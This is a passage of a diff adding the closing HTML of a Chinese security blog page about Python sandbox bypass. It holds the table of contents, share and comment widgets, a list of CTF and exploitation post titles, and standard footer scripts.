+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2023/01/29/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90--Program%20header/">
+                    ELF文件解析--Program header
+                </a>
+            </div>
+        
+    </nav>
+
+
+
+  
+
+  <!-- code.copy.start -->
+	 <!-- 
+<script src="/js/clipboard.js"></script>
+  -->
+	 <!-- 
+<script src="/js/jquery.min.js"></script>
+ -->
+	 <!-- 
+<script src="/js/clipboard_use.js"></script>
+ -->
+	<script type="text/javascript" src="/js/clipboard.js"></script>
+ 	<script type="text/javascript" src="/js/jquery.min.js"></script>
+	<script type="text/javascript" src="/js/clipboard_use.js"></script>
+
+    <!-- code.copy.end -->
+</article>
+
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#object属性与内置函数"><span class="toc-text">object属性与内置函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#可利用的内置函数"><span class="toc-text">可利用的内置函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#计算类内置函数"><span class="toc-text">计算类内置函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#比较内置函数"><span class="toc-text">比较内置函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#特殊内置函数"><span class="toc-text">特殊内置函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#builtins中的内鬼"><span class="toc-text">builtins中的内鬼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内鬼-sitebuiltins"><span class="toc-text">内鬼_sitebuiltins</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#由-site-模块添加的常量"><span class="toc-text">由 site 模块添加的常量</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#意外收获"><span class="toc-text">意外收获</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-4 i,
+        .toc-level-4 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Python-sandbox bypass '(' and ')' to  calling function　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC81NDYyMC8zMTA5MQ==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+	
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+	
+       })(document, 'script');
+	
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+
+	</div>
+
+    <!-- City版安装代码已完成 -->
+<script type="text/javascript">
+    
+setInterval(function () {
+    var box = document.querySelector(".trc_rbox_container");
+    if(box) box.outerHTML = "";
+}, 2000);
+document.getElementById("taboola-livere").style='display:none';
+</script>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2023/01/29/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90--Program%20header/" title="下一篇: ELF文件解析--Program header">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/04/20/python-sandbox%20bypass%20'()'%20to%20%20runing%20function/">Python-sandbox bypass '(' and ')' to  calling function</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/29/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90--Program%20header/">ELF文件解析--Program header</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/07/ELF%E6%96%87%E4%BB%B6%E5%A4%B4%E8%A7%A3%E6%9E%90%E5%AD%A6%E4%B9%A0/">ELF文件解析--ELF header 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/16/decrypt_safe_linking/">how2heap-decrypt_safe_linking学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/02/2022%E5%B7%9D%E6%B8%9D%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B--hard_login/">2022川渝职业技能竞赛初赛--hard_login</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp/">2022川渝个人赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/26/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/">搜索引擎语法学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/17/how2heap-fastbin_reverse_into_tcache-%E5%AD%A6%E4%B9%A0/">how2heap-fastbin_reverse_into_tcache-学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/">how2heap-house_of_botcake-学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/">在unity中使用DragonBones骨骼的方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/">RITSEC-CTF-2022-PWN-hangpwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/">HTB-Login Simulator-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/">HTB-baby_ninja_jinja-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-Neonify-web-challenge-wp/">HTB-Neonify-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/08/HTB-Pandora-wp/">HTB-Pandora-Machine-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/22/HSC2021-CTF/">HSC2021-CTF-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/31/sctf2021-pwn-dataleak/">sctf2021-pwn-dataleak-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/04/%E4%B8%9C%E8%BD%AF/">东软2021CTF--PWN--wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/03/cosy-casino-pwn-challenge-wp/">HTB-cosy_casino-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/">2021年春秋杯网络安全联赛秋季赛勇者山峰-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/">Large bin Attack for Glibc 2.31 学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/">解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/">Hunting— HTB  PWN  challenge</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/">xman的leve5另一种解法(mprotect)学习与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/">ctfshow-月饼杯2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/16/'could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!'%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/">\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/">5种字符'(^.9)'构造php_shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/17/ractf2021-pwn-ctf/">ractf2021-pwn-ctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">高版本libc(2.29-2.32) off by null利用姿势笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/26/2021qwb%20pwn%20wp/">2021qwb-pwn-初赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/28/ISCC2021%20PWN%20WP/">ISCC2021 PWN部分 WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/">ret2dl-resolve利用方法小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">系统调用与SROP方法学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/">pwn堆题泄露libc真实地址小tirck</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/">2021*CTF_PWN_babyheap复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/">关于格式化字符串利用——学pwn小记(9)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/">Tcache attack初学习——学pwn小记(8)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/">从对b00k题目学习中初习off-by-one——学pwn小记(7)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/actf--wp/">ångstromCTF 2021--wp与复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">修改ELF文件libc为指定版本</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数——学pwn小记(6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/">fastbin二次释放——学pwn小记(5)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">关于sql注入bypass总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">安洵杯2019复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">flask.request的内置属性总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/">对php伪协议的归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/">HWCTF-华为云场WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">linux 内置参数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">关于jinja2特性对ssti的bypass的影响</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php执行与文件系统处理函数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/">第五届上海市大学生网络安全大赛-初赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/">ctf-show_原谅杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/ctf-show%201024%E6%9D%AF/">ctf-show 1024杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/">Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp/第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/">学习pwn小记(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">对linux 命令执行的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">关于SQL注入小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/">安恒DASCTF 7月赛WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/15/rgbCTF--wp/">sctf2020 pythonbox题目复现小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/NahamCon%20CTF%20WP/">NahamCon CTF WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">对于文件包含漏洞的知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于php反序列化字符逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/">如何让文件里PHP代码被服务器解析执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/">虎符CTF2020--EasyLogin WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于python ssti的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/">cocos2d官方文档汉化--Writing a cocos2d application</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+
+</div>
+
+
+
+
+  
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+        	                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("01/03/2019 12:39:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2023 lexsd6
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+
+    <div class="visit">
+        
+            <span id="busuanzi_container_site_pv" style='display:inline'>
+                <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                </span>
+            </span>
+        
+        
+            <span>| </span>
+        
+        
+            <span id="busuanzi_container_page_pv" style='display:inline'>
+                <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                </span>
+            </span>
+        
+    </div>
+
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  </div>
+
+
+</body>
+</html>
